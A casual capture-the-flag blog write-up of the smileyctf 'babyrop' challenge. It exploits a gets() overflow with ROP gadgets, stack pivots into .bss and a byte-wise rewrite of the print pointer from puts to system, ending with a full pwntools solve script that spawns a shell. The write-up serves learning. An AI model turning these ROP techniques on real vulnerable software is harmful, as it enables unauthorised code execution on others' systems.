---
layout: post
title: smileyctf/babyrop
date: 2026-02-08 05:40:00 +0800
---

recommended listening for this post is [gips by sheena ringo.](https://www.youtube.com/watch?v=zldBTSx9JpE)

![yup](https://i.redd.it/xqk7cg8tacie1.gif)

cool challenge which took me around 3 hours to solve using what might actually be one of the dumbest solutions of all time! (tl;dr byte ptr add gadget and a DREAM)


the challenge is a simple minimal ROP challenge. after decompiling the main function we get this:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(_bss_start, 0);
  memset(s, 0, sizeof(s));
  gets(s);
  print(s);
  return 0;
}
```

essentially, we have a `gets()` call, so we can trivially overwrite the return address of this function call for ROP. the problem is we are not exactly spoiled for choice: there are very few usable gadgets to work with. however, checksec reveals that the binary has no PIE, no canary, but.. full RELRO. D:

```c
wrenches@kitty (~/work/pwn/babyrop) > checksec --file=vuln_patched
[*] '/home/wrenches/work/pwn/babyrop/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

at this point it behooves us to look into the assembly ( we will have to stare at a lot of assembly for the entire duration of this challenge xd)

disassembling the main function reveals a few nice things.

```c
Dump of assembler code for function main:
   0x00000000004011cf <+0>:	endbr64
   0x00000000004011d3 <+4>:	push   rbp
   0x00000000004011d4 <+5>:	mov    rbp,rsp
   0x00000000004011d7 <+8>:	sub    rsp,0x20
   0x00000000004011db <+12>:	mov    rax,QWORD PTR [rip+0x2e36]        # 0x404018 <stdout@GLIBC_2.2.5>
   0x00000000004011e2 <+19>:	mov    esi,0x0
   0x00000000004011e7 <+24>:	mov    rdi,rax
   0x00000000004011ea <+27>:	call   0x401060 <setbuf@plt>
   0x00000000004011ef <+32>:	lea    rax,[rbp-0x20]
   0x00000000004011f3 <+36>:	mov    edx,0x20
   0x00000000004011f8 <+41>:	mov    esi,0x0
   0x00000000004011fd <+46>:	mov    rdi,rax
   0x0000000000401200 <+49>:	call   0x401070 <memset@plt>
   0x0000000000401205 <+54>:	lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:	mov    rdi,rax
   0x000000000040120c <+61>:	call   0x401183 <gets>
   0x0000000000401211 <+66>:	mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
   0x0000000000401218 <+73>:	lea    rax,[rbp-0x20]
   0x000000000040121c <+77>:	mov    rdi,rax
   0x000000000040121f <+80>:	call   rdx
   0x0000000000401221 <+82>:	mov    eax,0x0
   0x0000000000401226 <+87>:	leave
   0x0000000000401227 <+88>:	ret
End of assembler dump.
```

first things first: `gets()` is called on a buffer relative to `rbp`. because of the `leave; ret` function epilogue at the bottom, we can directly control `rbp`. this means that if we pivot the stack carefully, we can overwrite whatever we want.

second things second: indirect call at `call rdx...`?

```c
   0x0000000000401211 <+66>:	mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
   0x0000000000401218 <+73>:	lea    rax,[rbp-0x20]
   0x000000000040121c <+77>:	mov    rdi,rax
   0x000000000040121f <+80>:	call   rdx
   0x0000000000401221 <+82>:	mov    eax,0x0
```

`rdx` is loaded from a fixed region in memory, but this is weird because it's not an area in the GOT. in fact, the function pointer `print` is actually in writable memory in `.bss`. 

```c
gef> vmmap 0x404000
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000404000 0x0000000000405000 0x0000000000001000 0x0000000000005000 rw- [hey look at that its rw-] /home/wrenches/work/pwn/babyrop/vuln_patched +0x0
gef>
```

this means that we can indeed overwrite this pointer and do arbitrary calls. the problem is, we would need a libc leak to find where `system()` is in libc.

from here, i tried seeing if we could pivot the stack such that we could call `puts()` on itself (hence leaking the pointer), but i had no such luck with this. i think this is definitely possible and a _lot_ easier than the method i went with, but if i did the easy simple route this wouldnt be funny enough to make a writeup on

anyways, what did i actually do? let's find out together! i will highlight the gadgets that i have used, from the ROPgadget output:

```c
0x000000000040115d : pop rbp ; ret
0x000000000040117e : pop rcx ; ret
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011ca : mov eax, dword ptr [rbp - 4] ; leave ; ret
```

mm, yes, a `pop rbp`, a `pop rcx`, and.. an `add byte ptr...` erm.. yup..

so, the key concept here is that we can use the add gadget to increment our writable pointer to `puts` in memory without ever having to actually leak the value of `puts`. note the snippet below, which shows that all but the last 3 bytes of the `puts` and `system` ptrs are the same.

```c
gef> x/4g 0x404010
0x404010 <print>:	0x7ffff7c87be0	0x7ffff7e045c0
0x404020 <completed>:	0x0	0x0
gef> p puts
$1 = {<text variable, no debug info>} 0x7ffff7c87be0 <puts>
gef> p system
$2 = {<text variable, no debug info>} 0x7ffff7c58750 <system>
```

so, if we just modify each of those 3 bytes with three separate rop chain stages, we can convert `puts` into `system` and win! yup!

of course, we need to control `al`, which is why we have that `mov eax, dword ptr [rbp - 4]` gadget. recall that we can just pivot our stack to .bss, write whatever values we want there, and then use a `pop rbp` in conjunction with this `mov` gadget such that we move our needed values into `eax`.

( we also need to control `rcx`, but we have a direct `pop rcx ; ret` gadget gifted to us by the smileyctf gods so this is trivial to use )

however! astute readers may have noticed that this `mov eax, dword ptr [rbp - 4]` is not all sunshine and rainbows!! let's look at it closer:

```c
0x00000000004011ca : mov eax, dword ptr [rbp - 4] ; leave ; ret
```

aw FUCK kena `leave`

soo uhh yeah this `leave (mov rsp, rbp ; pop rbp)` instruction fucking sucks, _because_ we have to pivot `rbp` to control our `rax` value, our `rsp` will end up `0x04` bytes away from the value where `rax` is stored, meaning that the so-called 'flow' of our ROP chain will be broken up by these intermittent and uncontrollable 'pivots' elsewhere into memory.

let's illustrate what this actually means:

```c
gef> p $rsp
$1 = (void *) 0x404930
gef> p $rbp
$2 = (void *) 0x404118

-- instrs -- 
<gets+0x47>   mov    eax, DWORD PTR [rbp - 0x4]
<gets+0x4a>   leave
<gets+0x4b>   ret

-- fields near rbp --
gef> x/16g $rbp-0x08
0x404110: 0x[7000]000000 <- that will get mov'd into rax	
0x404118: 0x0 <- when we do mov rsp; rbp, this is where the new rsp will go
0x404120: 0x40115b <- next rip (after ret) ...
... chain continues
```

naturally, if we try to continue the chain, eventually we will run into another `mov rsp, rbp`, and the nice chain of retaddrs in our stack will get disrupted, which makes our actual exploit really annoying to write!

i circumvented this by simply writing the payload in 3 stages:

first stage: pivot:

```python
# pivot stack into bss first, preparatory measure
p1 = b'\x10' * 0x20
p1 += p64(0x404100) # bss
p1 += p64(0x401205) # this points us back to our write

p.send(p1)
p.recvline()
```

standard stack pivot, nothing to see here. keep in mind that because we have now shifted `rbp` to `0x404100`, our next write will be to `0x4040e0`

second stage:

```py
p2 = b'\x20' * 0x20
p2 += p64(0x404900) + p64(0x401205) # ret back to read
```

another pivot to `0x404900`, which is farther up in writable memory (so when the stack grows down we wont hit a nasty segfault), and another address back to read. and then.. uhhh

```py
# 0x404110; step 1
p2 += b'\x00' * 4 + p32(0x70) # byte that gets added
p2 += p64(0) # mov rsp, rbp, pop rbp
p2 += p64(ADD_PTR_RCX) + p64(0x404228) # this gadget also has a pop rbp
# and then do it all over
p2 += p64(POP_RCX) + p64(0x404011)
p2 += p64(MOV_EAX)
```

essentially, we make use of the boundless `gets()` write and just write the rop chains before they even get executed. we prepare the byte that gets added, the next values of rbp, the next values of rcx, and then call our `mov eax` gadget again (which as we recall, will shift our stack to somewhere else in memory). where is that somewhere else?

```python

p2 += b'/bin/sh\x00' # yeah just fucki just put it anywhere wh gives a shit
p2 += b'\xAA' * (0x140 - len(p2)) # pad

# 0x404220
p2 += b'\x00' * 4 + p32(0x0c)
p2 += p64(0)
p2 += p64(ADD_PTR_RCX) + p64(0x404338)
p2 += p64(POP_RCX) + p64(0x404012)
p2 += p64(MOV_EAX)
p2 += b'\xBB' * (0x250 - len(p2))

# 0x404330
p2 += b'\x00' * 4 + p32(0xfd)
p2 += p64(0)
p2 += p64(ADD_PTR_RCX) + p64(0x404958) # MYSTERY MOUSEKATOOL
p2 += p64(0x4011cd) # leave ; ret
```

yeah just put it further down the line who gives a shit (keep in mind that after this `gets()` call, these separate rop chains dont actually get executed, we're just preparing them for later. also keep an eye out for that line labelled `mystery mousekatool`  - recall that after the `add_ptr_rcx` gadget there is a `pop rbp`, meaning that `0x404958` is popped into rbp. directly after that is a `leave; ret;`, meaning whatever value is at `0x404958` goes into rbp, and whatever value is at `0x404960` goes into rsp (and consequently, our instruction pointer). of course, right now, those are all uninitialized. but...

final stage:

```python
# 0x4048e0
p3 = b'\x30' * 0x28

p3 += p64(POP_RCX) + p64(0x404010)
p3 += p64(POP_RBP) + p64(0x404118)
p3 += p64(MOV_EAX)
p3 += b'\x55' * 0x28

# 0x404960
p3 += p64(0x404168) # final rbp
p3 += p64(0x40101a) # ret to account for movaps
p3 += p64(0x4011ef) # final ret
```

in our third stage we just perform the first little bit of the ROP chain, and put `0x404118` into rbp. meaning, at the very start, at p2:

```python
# 0x404110; step 1
p2 += b'\x00' * 4 + p32(0x70) # byte that gets added
p2 += p64(0) # mov rsp, rbp, pop rbp
p2 += p64(ADD_PTR_RCX) + p64(0x404228) # this gadget also has a pop rbp
# and then do it all over
p2 += p64(POP_RCX) + p64(0x404011)
p2 += p64(MOV_EAX)
```

we jump all the fucking way back here !

so, after we send p3, we initialize our rop chain then pivot into the three different frames at p2, which all increment the ptr to `puts()` byte-by-byte. then after p2 is done, we jump _BACK_ to p3 and finish execution. (the final return address eventually sends us back to the `puts()` call, which is now `system()`, and we just exploit the fact that the `gets()` buffer and the `puts()` buffer r the same by inputting `'/bin/sh`').

uhhhh,,,, yeaaaaa listen man i dont know either. it works! full solvescript i guess

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["alacritty", "-e", "bash", "-c"]

p = process()
gdb.attach(p)

# pivot stack into bss first, preparatory measure
p1 = b'\x10' * 0x20
p1 += p64(0x404100) # bss
p1 += p64(0x401205)

p.send(p1)
p.recvline()

POP_RCX = 0x000000000040117e
POP_RBP = 0x000000000040115d
MOV_EAX = 0x00000000004011ca
ADD_PTR_RCX = 0x000000000040115b

# write to 0x4040e0
p2 = b'\x20' * 0x20
p2 += p64(0x404900) + p64(0x401205) # ret back to read
# preparing the ROP frames for later

# 0x404110; step 1
p2 += b'\x00' * 4 + p32(0x70) # byte that gets added
p2 += p64(0) # mov rsp, rbp, pop rbp
p2 += p64(ADD_PTR_RCX) + p64(0x404228) # this gadget also has a pop rbp
# and then do it all over
p2 += p64(POP_RCX) + p64(0x404011)
p2 += p64(MOV_EAX)

p2 += b'/bin/sh\x00' # yeah just fucki just put it anywhere wh gives a shit
p2 += b'\xAA' * (0x140 - len(p2)) # pad

# 0x404220
p2 += b'\x00' * 4 + p32(0x0c)
p2 += p64(0)
p2 += p64(ADD_PTR_RCX) + p64(0x404338)
p2 += p64(POP_RCX) + p64(0x404012)
p2 += p64(MOV_EAX)
p2 += b'\xBB' * (0x250 - len(p2))

# 0x404330
p2 += b'\x00' * 4 + p32(0xfd)
p2 += p64(0)
p2 += p64(ADD_PTR_RCX) + p64(0x404958)
p2 += p64(0x4011cd) # leave ; ret

p.send(p2)
p.recvline()
# 0x4048e0
p3 = b'\x30' * 0x28

p3 += p64(POP_RCX) + p64(0x404010)
p3 += p64(POP_RBP) + p64(0x404118)
p3 += p64(MOV_EAX)
p3 += b'\x55' * 0x28

# 0x404960
p3 += p64(0x404168) # final rbp
p3 += p64(0x40101a) # movaps
p3 += p64(0x4011ef) # final ret

p.send(p3)
p.recvline()
p.interactive()
```

this is like my second time doing a challenge of this nature and i think its quite funny that so early in i am already having to resort to this bullshit. the nature of these kinds of challenges is that theres many beautiful ways to do them (You Can Probably Ret2dlresolve This I Think I Dont Know really) but anyways well i had fun i guess ,,, like and subscribe for more normal pwn solutions


